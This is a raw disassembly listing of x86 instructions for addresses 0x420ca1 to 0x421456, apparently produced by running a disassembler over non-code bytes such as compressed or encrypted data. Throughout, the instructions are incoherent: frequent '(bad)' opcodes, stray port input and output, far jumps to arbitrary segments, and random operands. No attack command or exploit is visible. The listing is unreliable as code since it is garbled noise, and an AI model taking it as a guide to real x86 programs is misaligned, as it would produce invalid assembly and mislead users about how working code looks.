  420ca1:	or     BYTE PTR [ecx-0x12b99ebc],cl
  420ca7:	aaa    
  420ca8:	inc    edi
  420ca9:	push   es
  420caa:	ret    0x2501
  420cad:	inc    edi
  420cae:	push   0xffffffcc
  420cb0:	(bad)  
  420cb1:	lahf   
  420cb2:	inc    DWORD PTR [edi]
  420cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cb5:	mov    al,ds:0xe1f5c675
  420cba:	dec    edx
  420cbb:	cdq    
  420cbc:	dec    edx
  420cbd:	je     0x420cc6
  420cbf:	mov    dl,0x2b
  420cc1:	clc    
  420cc2:	cwde   
  420cc3:	push   ss
  420cc4:	enter  0xf364,0xf5
  420cc8:	and    ecx,DWORD PTR [ebx+0x3ad58264]
  420cce:	das    
  420ccf:	cmp    eax,0xcb06deb4
  420cd4:	adc    eax,0xbf005eb4
  420cd9:	dec    ebx
  420cda:	push   0x60c1aa6e
  420cdf:	cld    
  420ce0:	add    DWORD PTR [ebx-0x38],esp
  420ce3:	mov    ebx,0x78c94ffa
  420ce8:	mov    WORD PTR [ebx+0x3b],ds
  420ceb:	out    dx,eax
  420cec:	sub    eax,0x52bedfc0
  420cf1:	bound  edx,QWORD PTR [eax-0x6dd03ac9]
  420cf7:	pop    esp
  420cf8:	loopne 0x420c89
  420cfa:	push   esp
  420cfb:	adc    ah,BYTE PTR [esi-0x4308f88e]
  420d01:	push   edi
  420d02:	inc    ecx
  420d03:	jnp    0x420d58
  420d05:	in     al,dx
  420d06:	push   esp
  420d07:	aaa    
  420d08:	(bad)  
  420d0a:	jbe    0x420d38
  420d0c:	mov    ah,0x7b
  420d0e:	je     0x420cf8
  420d10:	xchg   edi,eax
  420d11:	pop    ebp
  420d12:	jl     0x420d71
  420d14:	jle    0x420d6b
  420d16:	imul   ebx,DWORD PTR [esi-0x74],0xffffffbe
  420d1a:	and    al,0x54
  420d1c:	cmp    al,0x7a
  420d1e:	pushf  
  420d1f:	sbb    eax,0x44ec2428
  420d24:	push   0xb6098eba
  420d29:	pop    edx
  420d2a:	shr    DWORD PTR [ebx-0x76],cl
  420d2d:	push   edi
  420d2e:	jns    0x420d3d
  420d30:	sub    edi,DWORD PTR [esi+0x35]
  420d33:	and    cl,ch
  420d35:	call   0xce41ea90
  420d3a:	fwait
  420d3b:	adc    esi,DWORD PTR [ebp-0x258ca33]
  420d41:	mov    dh,0x5c
  420d43:	outs   dx,DWORD PTR ds:[esi]
  420d44:	fimul  DWORD PTR ds:0xaa2daf51
  420d4a:	shl    esi,1
  420d4c:	add    al,0xa0
  420d4e:	clc    
  420d4f:	std    
  420d50:	fcom   DWORD PTR [eax+0x1f]
  420d53:	adc    DWORD PTR [ebx+0x2],esp
  420d56:	dec    edx
  420d57:	push   esp
  420d58:	ss int3 
  420d5a:	sub    BYTE PTR [eax+0xe],dl
  420d5d:	or     BYTE PTR [ebp+edi*1-0x5e11cb96],ah
  420d64:	xor    ebx,DWORD PTR [edx-0x11]
  420d67:	push   edi
  420d68:	mov    al,ds:0x778abbaf
  420d6d:	sub    BYTE PTR [edi+ebp*8-0x38df99bc],cl
  420d74:	sub    bh,bh
  420d76:	jnp    0x420d8e
  420d78:	sub    edi,DWORD PTR [eax-0x1cc84176]
  420d7e:	loopne 0x420d87
  420d80:	or     ch,BYTE PTR [ebx+0x33]
  420d83:	in     al,0x42
  420d85:	popa   
  420d86:	jnp    0x420daa
  420d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d89:	push   esp
  420d8a:	pop    edi
  420d8b:	mov    dl,0x45
  420d8d:	or     esi,DWORD PTR [ebx-0x7709c72]
  420d93:	xchg   ebp,eax
  420d94:	loope  0x420df5
  420d96:	ror    DWORD PTR [ebp+0x61],0xe5
  420d9a:	mov    dh,0x65
  420d9c:	adc    al,0x79
  420d9e:	push   ecx
  420d9f:	jmp    0x2c143106
  420da4:	cmp    DWORD PTR [edi],eax
  420da6:	aam    0xb7
  420da8:	xor    DWORD PTR [ebp+0x1c],eax
  420dab:	inc    ecx
  420dac:	jae    0x420de0
  420dae:	pop    ss
  420daf:	in     eax,0x34
  420db1:	lods   eax,DWORD PTR ds:[esi]
  420db2:	sbb    eax,0x198f4155
  420db7:	pop    esi
  420db8:	mov    es,WORD PTR [ebx+0x7b]
  420dbb:	lahf   
  420dbc:	jbe    0x420ddc
  420dbe:	sub    dh,dh
  420dc0:	test   BYTE PTR [ebp+0x64],0xa2
  420dc4:	cmc    
  420dc5:	or     al,0x51
  420dc7:	out    dx,eax
  420dc8:	loop   0x420d80
  420dca:	pop    ss
  420dcb:	xchg   ebx,eax
  420dcc:	stc    
  420dcd:	xor    DWORD PTR ds:0xd3f05594,esi
  420dd3:	repz (bad) 
  420dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dd6:	in     al,dx
  420dd7:	mov    bl,0x18
  420dd9:	ins    BYTE PTR es:[edi],dx
  420dda:	push   ebp
  420ddb:	add    DWORD PTR [esp+esi*2+0x1e],esi
  420ddf:	push   ecx
  420de0:	es push edx
  420de2:	into   
  420de3:	imul   esi,DWORD PTR [ebx*2-0x3c7a1d17],0xffffffa0
  420deb:	out    dx,al
  420dec:	xchg   edx,eax
  420ded:	jmp    0x7c8af864
  420df2:	test   al,0xf7
  420df4:	rcr    DWORD PTR [ecx-0x317f9b7e],cl
  420dfa:	mov    esi,0xf28a7239
  420dff:	jecxz  0x420dc8
  420e01:	out    dx,eax
  420e02:	lods   al,BYTE PTR ds:[esi]
  420e03:	sbb    ebx,edx
  420e05:	in     eax,0x57
  420e07:	retf   0x992
  420e0a:	fmul   st,st(4)
  420e0c:	xor    cl,al
  420e0e:	(bad)  
  420e0f:	sti    
  420e10:	push   edx
  420e11:	stc    
  420e12:	sub    eax,0xf47384c1
  420e17:	ja     0x420e5d
  420e19:	add    edx,edi
  420e1b:	aaa    
  420e1c:	push   edi
  420e1d:	out    dx,al
  420e1e:	daa    
  420e1f:	cwde   
  420e20:	pusha  
  420e21:	jb     0x420e87
  420e23:	mov    ah,0xe7
  420e25:	ret    0x7e7b
  420e28:	(bad)  
  420e29:	rcr    BYTE PTR [ebx+edi*8],cl
  420e2c:	idiv   DWORD PTR fs:[edx-0x8]
  420e30:	pop    ecx
  420e31:	add    DWORD PTR [ecx],edi
  420e33:	adc    edx,esi
  420e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e36:	pop    ss
  420e37:	(bad)  
  420e38:	jg     0x420ddf
  420e3a:	addr16 (bad) 
  420e3c:	repnz or al,0xd8
  420e3f:	push   cs
  420e40:	lea    eax,[eax]
  420e42:	imul   ebx,edx,0xffffffaf
  420e45:	adc    DWORD PTR [edx],esi
  420e47:	jae    0x420e0a
  420e49:	pop    ebp
  420e4a:	in     al,dx
  420e4b:	(bad)  
  420e4c:	mov    dl,0x7
  420e4e:	xor    al,0xba
  420e50:	out    0x3b,al
  420e52:	or     edi,ebx
  420e54:	mov    esi,0x6deafaba
  420e59:	mov    esp,0x1a27c9ae
  420e5e:	outs   dx,BYTE PTR ds:[esi]
  420e5f:	adc    eax,0x84b2e388
  420e64:	dec    ebx
  420e65:	jge    0x420e3e
  420e67:	aam    0xf6
  420e69:	and    DWORD PTR [ebx],esi
  420e6b:	push   esp
  420e6c:	mov    BYTE PTR [eax-0x35],bl
  420e6f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e71:	dec    esp
  420e72:	mov    bl,0x32
  420e74:	clc    
  420e75:	sbb    al,0xa3
  420e77:	pop    eax
  420e78:	mov    eax,0x3fd1175e
  420e7d:	js     0x420ebf
  420e7f:	jno    0x420eb1
  420e81:	shr    DWORD PTR [edi],1
  420e83:	pusha  
  420e84:	ins    BYTE PTR es:[edi],dx
  420e85:	add    al,0x3a
  420e87:	push   0xffffff9b
  420e89:	push   ss
  420e8a:	punpcklwd mm4,mm4
  420e8d:	mov    ds:0x24c99810,al
  420e92:	rcr    BYTE PTR [ebp+0xe6d52b],1
  420e98:	mov    bh,0x4a
  420e9a:	xor    DWORD PTR ds:0x66ce0fdf,edi
  420ea0:	(bad)  
  420ea1:	dec    esp
  420ea2:	cmp    al,0xd2
  420ea4:	or     DWORD PTR [edx+0x24fef8],esp
  420eaa:	retf   0x4b64
  420ead:	int3   
  420eae:	enter  0x29a1,0xfb
  420eb2:	dec    DWORD PTR [esi]
  420eb4:	repnz ins BYTE PTR es:[edi],dx
  420eb6:	add    bl,BYTE PTR [ebx+0x74]
  420eb9:	adc    BYTE PTR [esi],0x9f
  420ebc:	mov    ah,0xd1
  420ebe:	imul   ebp,DWORD PTR [esi-0x3f0ac5b9],0x14
  420ec5:	cmp    BYTE PTR [edi+edi*4],cl
  420ec8:	int    0x15
  420eca:	outs   dx,BYTE PTR ds:[esi]
  420ecb:	outs   dx,DWORD PTR ds:[si]
  420ecd:	ret    
  420ece:	xor    edi,DWORD PTR [ebx+0x42]
  420ed1:	mov    ch,0x63
  420ed3:	repnz push edx
  420ed5:	jnp    0x420ef6
  420ed7:	push   es
  420ed8:	inc    ebp
  420ed9:	adc    DWORD PTR [edi+0x21],0xfffffff7
  420edd:	inc    esp
  420ede:	cmp    ah,BYTE PTR [ebx+0x5585fc06]
  420ee4:	pusha  
  420ee5:	mov    ecx,0xd207764c
  420eea:	out    0xe4,eax
  420eec:	lods   al,BYTE PTR ds:[esi]
  420eed:	leave  
  420eee:	mov    ah,BYTE PTR [eax+ebp*4+0x54fcf11d]
  420ef5:	push   0xfffffff7
  420ef7:	popa   
  420ef8:	pop    ebx
  420ef9:	push   ss
  420efa:	fdiv   st,st(3)
  420efc:	xchg   ah,ch
  420efe:	or     BYTE PTR [ecx-0xfc08924],dl
  420f04:	mov    ebp,0x33799cd6
  420f09:	cmp    al,0xe7
  420f0b:	push   ecx
  420f0c:	xchg   BYTE PTR [edi+0x73],cl
  420f0f:	out    dx,al
  420f10:	cvttps2pi mm3,QWORD PTR [edi+eiz*8+0x2be8d55c]
  420f18:	mov    eax,0x7e5eb3f6
  420f1d:	push   es
  420f1e:	mov    al,ds:0x3974a54d
  420f23:	fs in  eax,dx
  420f25:	popa   
  420f26:	aas    
  420f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f28:	outs   dx,DWORD PTR ds:[esi]
  420f29:	xchg   DWORD PTR [esi-0x70],eax
  420f2c:	in     al,dx
  420f2d:	mov    dl,0x4e
  420f2f:	push   esi
  420f30:	(bad)  
  420f31:	mov    esp,0xd83c23bb
  420f36:	mov    bh,0xc
  420f38:	or     al,0x25
  420f3a:	stos   DWORD PTR es:[edi],eax
  420f3b:	push   cs
  420f3c:	ror    BYTE PTR [ebp-0x4d6bf34],1
  420f42:	or     eax,esi
  420f44:	pusha  
  420f45:	mov    eax,0xdce557ac
  420f4a:	cmp    edi,DWORD PTR [esi-0xc]
  420f4d:	(bad)  
  420f4e:	shl    BYTE PTR [edi+0x674cbea7],1
  420f54:	pop    ds
  420f55:	div    DWORD PTR [esi+0x42]
  420f58:	mov    bh,0x8f
  420f5a:	xchg   ah,dh
  420f5c:	aas    
  420f5d:	(bad)  
  420f5e:	aam    0xe3
  420f60:	(bad)  
  420f61:	add    DWORD PTR [edx+0x1d],eax
  420f64:	mov    bl,BYTE PTR [ecx-0x247becec]
  420f6a:	push   cs
  420f6b:	in     al,dx
  420f6c:	mov    WORD PTR [edx+0x449616e2],fs
  420f72:	outs   dx,BYTE PTR ds:[esi]
  420f73:	or     DWORD PTR [ecx],ebp
  420f75:	xlat   BYTE PTR ds:[ebx]
  420f76:	mov    ecx,0xd5b33f26
  420f7b:	jl     0x420fd9
  420f7d:	fcomi  st,st(5)
  420f7f:	mov    al,0x8e
  420f81:	mov    dl,0xfa
  420f83:	pop    es
  420f84:	mov    edx,0xf458d88c
  420f89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f8a:	rcl    edx,1
  420f8c:	loope  0x420f4f
  420f8e:	xchg   ebp,eax
  420f8f:	ss and eax,0x35f645bc
  420f95:	sbb    BYTE PTR [edx-0x76],dh
  420f98:	retf   0x5e50
  420f9b:	xor    DWORD PTR [ebp+0x14a9355],ebx
  420fa1:	inc    ecx
  420fa2:	ds mov bl,0x5
  420fa5:	out    dx,eax
  420fa6:	mov    al,ds:0x9bf81fb1
  420fab:	mov    eax,ds:0x6d7e33bf
  420fb0:	and    al,0x5f
  420fb2:	or     DWORD PTR [ebx+0x4c20c8be],0x25a5198c
  420fbc:	add    edx,DWORD PTR [ebx+0x6b420bb5]
  420fc2:	std    
  420fc3:	sub    ah,BYTE PTR [edi-0x4c]
  420fc6:	sbb    eax,0x6cd97ca3
  420fcb:	retf   
  420fcc:	dec    esp
  420fcd:	mov    ?,WORD PTR [ebp+eiz*2+0x1fc103fd]
  420fd4:	retf   
  420fd5:	or     DWORD PTR [ebp+0x5d],esi
  420fd8:	xor    eax,0x2042aefb
  420fdd:	cli    
  420fde:	or     bl,BYTE PTR [ebp+0x2ff142e]
  420fe4:	dec    ebp
  420fe5:	pop    esp
  420fe6:	push   0xffffffb8
  420fe8:	sub    ebx,DWORD PTR [edx+edi*8-0x15]
  420fec:	pop    ecx
  420fed:	ins    DWORD PTR es:[edi],dx
  420fee:	loope  0x421069
  420ff0:	adc    ah,ah
  420ff2:	dec    ebp
  420ff3:	retf   0x3132
  420ff6:	jbe    0x420faa
  420ff8:	jb     0x420ff5
  420ffa:	pop    edi
  420ffb:	rcl    cl,cl
  420ffd:	test   DWORD PTR [ecx+0x2a],0x7f74b8fd
  421004:	in     al,0x66
  421006:	rcl    esi,cl
  421008:	push   es
  421009:	push   ss
  42100a:	sbb    BYTE PTR [eax+0x3accb893],dh
  421010:	outs   dx,BYTE PTR ds:[esi]
  421011:	jle    0x42106b
  421013:	mov    BYTE PTR [bx+si],cl
  421016:	mov    bl,0x8a
  421018:	mov    esi,esp
  42101a:	adc    ah,BYTE PTR [ecx]
  42101c:	or     al,0x79
  42101e:	mov    eax,0x6a951d03
  421023:	and    ch,BYTE PTR [ebx+0x8ac89f9]
  421029:	jge    0x420fc7
  42102b:	dec    esp
  42102c:	stc    
  42102d:	pop    ebx
  42102e:	mov    bh,0xc3
  421030:	and    BYTE PTR [edx+eiz*8+0xca28455],bl
  421037:	mov    dh,0x93
  421039:	cmp    dh,bh
  42103b:	xchg   BYTE PTR [ebx],bh
  42103d:	fwait
  42103e:	adc    al,0xb8
  421040:	mov    bh,0xeb
  421042:	sar    BYTE PTR [edi+0x25eb9b92],1
  421048:	sub    edx,eax
  42104a:	jb     0x421071
  42104c:	fistp  QWORD PTR ds:0xc4ebeafa
  421052:	scas   eax,DWORD PTR es:[edi]
  421053:	jl     0x42109c
  421055:	mov    ch,0x56
  421057:	xchg   ebx,eax
  421058:	lahf   
  421059:	jo     0x42109f
  42105b:	pop    ds
  42105c:	xchg   edi,eax
  42105d:	jle    0x421002
  42105f:	mov    esp,0x3442e96a
  421064:	cmp    BYTE PTR [eax+0xecfbc66],al
  42106a:	mov    cl,0x6d
  42106c:	test   BYTE PTR [ebp-0x68],0x75
  421070:	jns    0x4210d4
  421072:	data16 loopne 0x4210c4
  421075:	or     al,0x2e
  421077:	push   0x40
  421079:	mov    cl,0x7b
  42107b:	sub    dh,BYTE PTR [esi]
  42107d:	dec    ecx
  42107e:	aad    0x87
  421080:	mov    BYTE PTR [eax+0x6a1616e8],ah
  421086:	repnz pop ebx
  421088:	ss mov dh,0xac
  42108b:	or     edx,DWORD PTR [eax+0x47]
  42108e:	scas   al,BYTE PTR es:[edi]
  42108f:	lahf   
  421090:	inc    ecx
  421091:	sub    eax,0x13b3cade
  421096:	sbb    eax,0xdf65e960
  42109b:	mov    BYTE PTR [ebp+0x22b528ce],ch
  4210a1:	xor    esi,DWORD PTR [eax+0x3c]
  4210a4:	fwait
  4210a5:	pop    esp
  4210a6:	xchg   edx,eax
  4210a7:	inc    ecx
  4210a8:	popf   
  4210a9:	and    ebp,esi
  4210ab:	push   eax
  4210ac:	or     BYTE PTR [esi],dh
  4210ae:	or     BYTE PTR [ebx],dl
  4210b0:	mov    edx,0x7967e2b6
  4210b5:	pop    edi
  4210b6:	xor    bl,al
  4210b8:	stos   BYTE PTR es:[edi],al
  4210b9:	les    eax,FWORD PTR [edx-0x17cfcc64]
  4210bf:	sbb    ebx,DWORD PTR [esp+ebp*1+0x3d]
  4210c3:	inc    ecx
  4210c4:	lea    ecx,ds:0x46d8f960
  4210ca:	cmp    DWORD PTR [ebx],edx
  4210cc:	retf   0x92ec
  4210cf:	sub    bl,dh
  4210d1:	push   esi
  4210d2:	add    DWORD PTR [ebp-0x1502e6f4],ebx
  4210d8:	mov    ecx,0xd8d5fad2
  4210dd:	push   ds
  4210de:	xchg   ebx,eax
  4210df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210e0:	jg     0x421121
  4210e2:	pop    edi
  4210e3:	xor    eax,0x4697015
  4210e8:	jne    0x421103
  4210ea:	mov    BYTE PTR [eax],dh
  4210ec:	ret    0xe14d
  4210ef:	push   ecx
  4210f0:	mov    ah,0xc1
  4210f2:	xor    DWORD PTR [edi+eiz*4],0xffffffef
  4210f6:	adc    eax,0x55f7e95c
  4210fb:	mov    bh,0x6
  4210fd:	pushf  
  4210fe:	int    0xdf
  421100:	xchg   esp,eax
  421101:	jl     0x4210e3
  421103:	and    dh,BYTE PTR [esi+0x35]
  421106:	mov    esi,0x4269d990
  42110b:	retf   0x69aa
  42110e:	xchg   ecx,eax
  42110f:	inc    ebp
  421110:	cmp    ch,BYTE PTR [ebx-0x56]
  421113:	pop    ds
  421114:	out    dx,al
  421115:	jbe    0x4210cb
  421117:	(bad)  
  421118:	arpl   WORD PTR [edi-0x3712a91a],cx
  42111e:	cmp    dl,BYTE PTR [ecx]
  421120:	inc    ebp
  421121:	int    0x73
  421123:	scas   al,BYTE PTR es:[edi]
  421124:	jmp    0xfd35:0xcf9d5057
  42112b:	jnp    0x421163
  42112d:	sbb    esp,DWORD PTR [eax]
  42112f:	out    dx,eax
  421130:	repnz push ebx
  421132:	test   eax,0x48f7e2c5
  421137:	jg     0x4210e2
  421139:	or     al,0x11
  42113b:	je     0x421114
  42113d:	fwait
  42113e:	sub    eax,0x145eedff
  421143:	ja     0x421186
  421145:	cmp    ch,BYTE PTR [ebp+0x22]
  421148:	jmp    0x50dc:0x6b13fe0
  42114f:	stc    
  421150:	push   edi
  421151:	pop    esi
  421152:	push   ecx
  421153:	cmp    BYTE PTR [esi],0x9f
  421156:	xchg   esp,eax
  421157:	mov    edi,0x8d43ae78
  42115c:	dec    ebp
  42115d:	sub    al,BYTE PTR [ecx+0x62e09add]
  421163:	lds    ebx,FWORD PTR [esi-0x62]
  421166:	bound  esi,QWORD PTR [ebx]
  421168:	ins    BYTE PTR es:[edi],dx
  421169:	int    0x2f
  42116b:	or     BYTE PTR [edx+0x31],ch
  42116e:	cmc    
  42116f:	bound  eax,QWORD PTR [eax+0x50ee3803]
  421175:	data16 fsub QWORD PTR [edi]
  421178:	pop    esp
  421179:	sar    BYTE PTR [eax-0x4674e3c0],1
  42117f:	cmp    eax,0xaff3658a
  421184:	sub    al,0x60
  421186:	(bad)  
  421187:	and    DWORD PTR [ecx],esp
  421189:	fld    DWORD PTR [ecx+0x457ef803]
  42118f:	js     0x42112d
  421191:	cmp    eax,0x6e959290
  421196:	push   ecx
  421197:	test   al,0x12
  421199:	hlt    
  42119a:	mov    esi,0x30af21de
  42119f:	js     0x42121d
  4211a1:	cmp    BYTE PTR [edx+0x73],cl
  4211a4:	xor    eax,0x369a55ed
  4211a9:	or     ch,ch
  4211ab:	mov    eax,0xa33b2f3
  4211b0:	cmp    BYTE PTR [ecx],0x1e
  4211b3:	mov    WORD PTR [esi-0x21],?
  4211b6:	inc    edx
  4211b7:	jmp    0x9c63:0x5df2b3c3
  4211be:	cs jno 0x421168
  4211c1:	and    eax,0x44f3ae43
  4211c6:	cmp    DWORD PTR [ebx],ebp
  4211c8:	jle    0x421194
  4211ca:	push   es
  4211cb:	cmp    bl,ch
  4211cd:	sub    al,BYTE PTR fs:[ecx-0x4c49e96c]
  4211d4:	xor    BYTE PTR [edx+ebp*8+0x3cf4b9c9],bh
  4211db:	adc    BYTE PTR [ebp-0x5b],cl
  4211de:	stc    
  4211df:	repnz mov dh,0xc5
  4211e2:	jp     0x421258
  4211e4:	xchg   ebx,eax
  4211e5:	jmp    0xd612:0xe6f1eae6
  4211ec:	pushf  
  4211ed:	aam    0x27
  4211ef:	jne    0x4211c2
  4211f1:	mov    edx,0x5a6d233
  4211f6:	int    0x36
  4211f8:	and    cl,bl
  4211fa:	ins    DWORD PTR es:[edi],dx
  4211fb:	adc    eax,0x798e0c0b
  421200:	xor    ch,BYTE PTR [ebx-0x2afdc6c5]
  421206:	cmp    eax,0x8c1792df
  42120b:	lds    ebp,FWORD PTR [edi+eiz*8]
  42120e:	jle    0x42125a
  421210:	push   ds
  421211:	ins    DWORD PTR es:[edi],dx
  421212:	hlt    
  421213:	pop    edi
  421214:	cmp    al,0x35
  421216:	mov    bl,0x1
  421218:	out    dx,al
  421219:	jge    0x421275
  42121b:	xchg   DWORD PTR [esi+eax*4+0x7c],esi
  42121f:	mov    eax,ds:0x9b3ce124
  421224:	jne    0x42128d
  421226:	adc    BYTE PTR [ecx+edx*4-0x32a1560c],cl
  42122d:	pop    esi
  42122e:	cmp    eax,0x9f360c90
  421233:	jp     0x42124e
  421235:	cmp    eax,0xd4054ad7
  42123a:	enter  0x3a80,0x71
  42123e:	push   edx
  42123f:	loop   0x421269
  421241:	or     ebx,eax
  421243:	mov    ds:0xaa4a4675,eax
  421248:	cmp    al,0x42
  42124a:	cmp    BYTE PTR ds:0xdc645ac1,al
  421250:	out    dx,al
  421251:	xchg   edi,eax
  421252:	shr    esp,cl
  421254:	and    al,bl
  421256:	jge    0x42121f
  421258:	push   eax
  421259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125a:	dec    eax
  42125b:	ficom  WORD PTR [ecx-0x61]
  42125e:	aam    0xe9
  421260:	adc    eax,esp
  421262:	push   edi
  421263:	ss xor eax,0x74bfe70a
  421269:	rcl    BYTE PTR [edx+0x4dfe4986],1
  42126f:	and    BYTE PTR [ebx],dl
  421271:	dec    esp
  421272:	or     eax,0x5fb440d9
  421277:	icebp  
  421278:	lock inc edi
  42127a:	dec    edx
  42127b:	retf   
  42127c:	pop    ebp
  42127d:	pop    ss
  42127e:	retf   
  42127f:	in     eax,dx
  421280:	add    ah,ch
  421282:	sub    ch,bh
  421284:	xor    eax,0x66fe584e
  421289:	xchg   ebx,eax
  42128a:	push   edi
  42128b:	mov    ch,0xb8
  42128d:	add    BYTE PTR [ebp+0x57],bl
  421290:	(bad)  
  421291:	jb     0x421293
  421293:	sub    ebp,DWORD PTR [esi+0xb8b7b59]
  421299:	fs (bad) 
  42129b:	mov    ?,WORD PTR [eax+0x1f2e08e7]
  4212a1:	test   al,0x3b
  4212a3:	and    dh,ah
  4212a5:	popf   
  4212a6:	add    BYTE PTR [ebx-0x4e],ah
  4212a9:	pop    ss
  4212aa:	mov    esi,DWORD PTR [ebp+0x2b]
  4212ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212ae:	repnz outs dx,BYTE PTR ds:[esi]
  4212b0:	xor    DWORD PTR [edi+esi*4-0x3f],eax
  4212b4:	or     ebp,eax
  4212b6:	dec    eax
  4212b7:	fwait
  4212b8:	mov    ah,BYTE PTR [ebp-0x8]
  4212bb:	sbb    al,0xa7
  4212bd:	mov    esp,DWORD PTR [esi]
  4212bf:	add    dh,dh
  4212c1:	inc    ebp
  4212c2:	retf   0x541b
  4212c5:	dec    edi
  4212c6:	test   eax,0xee31f2f6
  4212cb:	push   esi
  4212cc:	xor    DWORD PTR [ecx-0x12],esp
  4212cf:	les    ebx,FWORD PTR [esi+0x46]
  4212d2:	or     bl,BYTE PTR [ebx]
  4212d4:	sub    DWORD PTR [edx-0x26b7e097],esp
  4212da:	and    DWORD PTR [ecx],ecx
  4212dc:	daa    
  4212dd:	sub    dh,ch
  4212df:	test   BYTE PTR [ecx],bl
  4212e1:	outs   dx,DWORD PTR cs:[esi]
  4212e3:	dec    esi
  4212e4:	add    ebx,ecx
  4212e6:	xor    esp,ebx
  4212e8:	out    dx,al
  4212e9:	shl    DWORD PTR [edi],0x48
  4212ec:	inc    edx
  4212ed:	ds sahf 
  4212ef:	mov    edi,0x571cf728
  4212f4:	mov    ch,0x9c
  4212f6:	out    0x24,eax
  4212f8:	inc    esi
  4212f9:	sbb    al,dh
  4212fb:	mov    bh,cl
  4212fd:	int    0x80
  4212ff:	(bad)  
  421300:	jnp    0x421372
  421302:	adc    al,0xff
  421304:	jge    0x421303
  421306:	add    al,0x29
  421308:	rcr    BYTE PTR cs:0x47a9c748,cl
  42130f:	ret    0x7270
  421312:	sub    BYTE PTR [esi+0x6a800d64],cl
  421318:	mov    ecx,0xe66418ef
  42131d:	in     al,dx
  42131e:	aas    
  42131f:	es xchg esi,eax
  421321:	pop    esp
  421322:	push   cs
  421323:	in     al,dx
  421324:	or     BYTE PTR [ebx-0x3cc4544c],al
  42132a:	scas   eax,DWORD PTR es:[edi]
  42132b:	lock cmp al,0x2
  42132e:	cs aad 0x54
  421331:	mov    eax,0x2bc3620c
  421336:	cli    
  421337:	sbb    edi,edi
  421339:	jnp    0x421329
  42133b:	repnz ins BYTE PTR es:[edi],dx
  42133d:	xchg   BYTE PTR [ecx],ah
  42133f:	mov    bh,BYTE PTR [eax-0x35]
  421342:	je     0x4213c2
  421344:	inc    eax
  421345:	leave  
  421346:	push   cs
  421347:	out    dx,eax
  421348:	pop    eax
  421349:	mov    ds:0x89124915,al
  42134e:	sub    eax,DWORD PTR [ebx]
  421350:	ss popf 
  421352:	or     eax,0xf172992f
  421357:	jo     0x4212ed
  421359:	pop    esp
  42135a:	jl     0x42138e
  42135c:	jmp    0x4df74bce
  421361:	ret    0x88a
  421364:	lds    ebp,FWORD PTR [eax-0x3b]
  421367:	fsub   st,st(1)
  421369:	cs stos DWORD PTR es:[edi],eax
  42136b:	adc    BYTE PTR [eax-0x12],cl
  42136e:	xor    eax,0x682452a6
  421373:	mov    eax,ds:0xd18039f0
  421378:	out    dx,eax
  421379:	jle    0x4213d3
  42137b:	lods   al,BYTE PTR ds:[esi]
  42137c:	ret    0x587
  42137f:	retf   
  421380:	mov    dh,0x2a
  421382:	or     DWORD PTR [eax],ebp
  421384:	loopne 0x4213ad
  421386:	push   ds
  421387:	stos   DWORD PTR es:[edi],eax
  421388:	cdq    
  421389:	mov    bh,ch
  42138b:	cdq    
  42138c:	xchg   ebp,eax
  42138d:	mov    cl,0xe9
  42138f:	das    
  421390:	pop    esp
  421391:	xchg   edx,eax
  421392:	aad    0x37
  421394:	mov    ebp,0x128fbee3
  421399:	(bad)  
  42139a:	sub    eax,DWORD PTR ds:0x60c104c4
  4213a0:	mov    edi,0xb42916be
  4213a5:	out    0x76,al
  4213a7:	jg     0x4213b7
  4213a9:	push   es
  4213aa:	mov    bh,0xfe
  4213ac:	mov    esp,cs
  4213ae:	add    DWORD PTR [edx+0x53],eax
  4213b1:	dec    esp
  4213b2:	push   ebx
  4213b3:	push   0x43
  4213b5:	iret   
  4213b6:	cmp    cl,BYTE PTR [edi-0x632b7c1f]
  4213bc:	sbb    edx,DWORD PTR [edi-0x7cab8d0a]
  4213c2:	mov    eax,ds:0xe98c6230
  4213c7:	inc    edx
  4213c8:	repz pop eax
  4213ca:	data16 test al,bh
  4213cd:	imul   eax,DWORD PTR [edi-0x52],0xffffffcb
  4213d1:	inc    esi
  4213d2:	retf   0xf478
  4213d5:	sbb    DWORD PTR [ebp+ebp*8+0x637b0adc],ebp
  4213dc:	xchg   esi,eax
  4213dd:	aad    0xd9
  4213df:	xchg   ecx,eax
  4213e0:	xchg   edi,eax
  4213e1:	jmp    0x82a8:0xb0ce22d2
  4213e8:	push   edi
  4213e9:	jl     0x4213bd
  4213eb:	jle    0x4213b0
  4213ed:	in     al,dx
  4213ee:	test   al,0x4b
  4213f0:	fld    DWORD PTR [eax+ecx*1-0x362d5159]
  4213f7:	ja     0x421453
  4213f9:	jg     0x4213c4
  4213fb:	or     bl,cl
  4213fd:	or     bl,al
  4213ff:	sub    eax,0x4197a8bf
  421404:	push   edx
  421405:	push   esi
  421406:	(bad)  
  421407:	int    0x2
  421409:	jge    0x4213b7
  42140b:	dec    ecx
  42140c:	cmp    al,0xcd
  42140e:	and    dh,BYTE PTR [ecx]
  421410:	sbb    al,0xad
  421412:	loopne 0x4213fd
  421414:	(bad)  
  421415:	push   edi
  421416:	dec    esp
  421417:	push   ss
  421418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421419:	fs cli 
  42141b:	rol    ebp,0x14
  42141e:	in     eax,0x8f
  421420:	out    dx,eax
  421421:	push   cs
  421422:	push   ss
  421423:	xor    al,ch
  421425:	xchg   esp,eax
  421426:	mov    al,0x4f
  421428:	cmp    BYTE PTR [ebx-0x2a79d001],ch
  42142e:	pop    edx
  42142f:	mov    cs,esi
  421431:	inc    edx
  421432:	loopne 0x421430
  421434:	outs   dx,DWORD PTR ds:[esi]
  421435:	cmc    
  421436:	bound  esp,QWORD PTR [edi]
  421438:	out    dx,eax
  421439:	add    dl,bl
  42143b:	fist   DWORD PTR [ecx-0x19]
  42143e:	ficomp DWORD PTR [ecx]
  421440:	cmovnp ebp,DWORD PTR [ecx+ebx*2-0x18]
  421445:	adc    al,0x14
  421447:	or     ebp,DWORD PTR [ecx-0x32]
  42144a:	ss call 0x8078c61b
  421450:	fiadd  DWORD PTR [edx-0x1cf58e39]
  421456:	out    dx,eax
